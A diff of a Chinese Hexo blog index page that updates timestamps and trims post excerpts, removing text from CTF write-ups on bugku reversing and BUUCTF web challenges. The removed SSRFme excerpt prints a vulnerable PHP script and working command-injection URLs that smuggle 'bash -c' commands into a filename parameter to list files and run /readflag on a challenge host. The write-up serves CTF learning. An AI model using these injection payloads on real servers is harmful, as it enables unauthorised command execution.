@@ -343,7 +343,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-07-29T15:31:32+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-29T15:38:12+08:00">
                 2019-07-29
               </time>
             
@@ -443,15 +443,18 @@
 
       
         
-          
-            <p>从现在要开始学一点逆向二进制了,先做一点bugku简单的逆向题学习学习.</p>
-<h2 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h2><p>下载到后直接拖到IDA里,直接可以看到printf函数.<br><img src="http://i2.tiimg.com/665720/8dcb9f37a6d36fa2.png" alt="Markdown"><br>对着最右边的字符一顿R,就得到flag了.</p>
-<h2 id="Easy-vb"><a href="#Easy-vb" class="headerlink" title="Easy_vb"></a>Easy_vb</h2><p>下载后拖到IDA,<code>ALT+T</code>搜索字符串,先搜flag搜不到,再搜<code>{</code>就出来了.<br><img src="http://i2.tiimg.com/665720/58215b81f8a2c501.png" alt="Markdown"></p>
-
-          
+          <p>从现在要开始学一点逆向二进制了,先做一点bugku简单的逆向题学习学习.</p>
+<h2 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h2><p>下载到后直接拖到IDA里,直接可以看到printf函数.<br><img src="http://i2.tiimg.com/665720/8dcb9f37a6d36fa2.png" alt="Markdown"><br>对着最右边的字符一顿R,就得到flag了.<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/29/bugku逆向/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
-    </div>
+    </p></div>
     
     
     
@@ -544,7 +547,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-07-29T14:54:52+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-29T15:38:13+08:00">
                 2019-07-29
               </time>
             
@@ -644,18 +647,17 @@
 
       
         
-          
-            <h2 id="Unicorn-shop"><a href="#Unicorn-shop" class="headerlink" title="Unicorn shop"></a>Unicorn shop</h2><p><a href="http://web3.buuoj.cn" target="_blank" rel="noopener">靶机</a><br>这道题想让我们买独角兽,当ID为1,2,3的时候<code>Wrong commodity!</code>,大于4<code>No commodity found!</code>,并且price只允许一个字符<code>Only one char(?) allowed!</code>,那就是要购买4了并且价格那里只能输入一个字符,但是怎么大于1337呢.F12发现网站编码是utf-8,那应该又是编码转换的问题了,在price写万,亿,兆成功获得flag,当然写其他语言的单位也可以,只要大于1337.</p>
-<h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p><a href="http://web7.buuoj.cn" target="_blank" rel="noopener">靶机</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">      $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p>
-<p>看了大佬们的博客才会的,<code>GET</code>命令漏洞如果文件存在会将其拼接到命令中,具体分析在<a href="http://momomoxiaoxi.com/2017/11/08/HITCON/" target="_blank" rel="noopener">大佬博客</a><br>查询ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L tool.lu/ip</span><br></pre></td></tr></table></figure></p>
-<p><code>php -a</code>进入php命令行交互：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> md5(<span class="string">"orange"</span>.yourip);</span><br></pre></td></tr></table></figure></p>
-<p>扫目录payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先建个文件</span></span><br><span class="line">http://web7.buuoj.cn/?url=&amp;filename=bash -c 'ls /'|</span><br><span class="line"><span class="comment">#执行命令后输出到chenxiyuan</span></span><br><span class="line">http://web7.buuoj.cn/?url=file:bash -c 'ls /'|&amp;filename=chenxiyuan</span><br><span class="line"><span class="comment">#访问</span></span><br><span class="line">http://web7.buuoj.cn/sandbox/<span class="number">99</span>ca4e36b9277744c847e190081f7fed/chenxiyuan</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bin</span></span><br><span class="line"><span class="string">boot</span></span><br><span class="line"><span class="string">dev</span></span><br><span class="line"><span class="string">etc</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">home</span></span><br><span class="line"><span class="string">lib</span></span><br><span class="line"><span class="string">lib64</span></span><br><span class="line"><span class="string">media</span></span><br><span class="line"><span class="string">mnt</span></span><br><span class="line"><span class="string">opt</span></span><br><span class="line"><span class="string">proc</span></span><br><span class="line"><span class="string">readflag</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string">run</span></span><br><span class="line"><span class="string">sbin</span></span><br><span class="line"><span class="string">srv</span></span><br><span class="line"><span class="string">sys</span></span><br><span class="line"><span class="string">tmp</span></span><br><span class="line"><span class="string">usr</span></span><br><span class="line"><span class="string">var</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
-<p>应该是执行<code>/readflag</code>来读取flag了,继续构造payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建文件</span></span><br><span class="line">http://web7.buuoj.cn/?url=&amp;filename=bash -c /readflag|</span><br><span class="line"><span class="comment">#执行命令输出到flag</span></span><br><span class="line">http://web7.buuoj.cn/?url=file:bash%20-c%20/readflag|&amp;filename=flag</span><br><span class="line"><span class="comment">#访问</span></span><br><span class="line">http://web7.buuoj.cn/sandbox/<span class="number">99</span>ca4e36b9277744c847e190081f7fed/flag</span><br></pre></td></tr></table></figure></p>
-
-          
+          <h2 id="Unicorn-shop"><a href="#Unicorn-shop" class="headerlink" title="Unicorn shop"></a>Unicorn shop</h2><p><a href="http://web3.buuoj.cn" target="_blank" rel="noopener">靶机</a><br>这道题想让我们买独角兽,当ID为1,2,3的时候<code>Wrong commodity!</code>,大于4<code>No commodity found!</code>,并且price只允许一个字符<code>Only one char(?) allowed!</code>,那就是要购买4了并且价格那里只能输入一个字符,但是怎么大于1337呢.F12发现网站编码是utf-8,那应该又是编码转换的问题了,在price写万,亿,兆成功获得flag,当然写其他语言的单位也可以,只要大于1337.<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/29/BUUCTF-web-writeup-二/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
-    </div>
+    </p></div>
     
     
     
@@ -1568,8 +1570,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-07-21T21:14:31+08:00">
-                2019-07-21
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-29T15:37:33+08:00">
+                2019-07-29
               </time>
             
           </span>
@@ -1630,7 +1632,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  955 字
+                  954 字
                 </span>
               
 
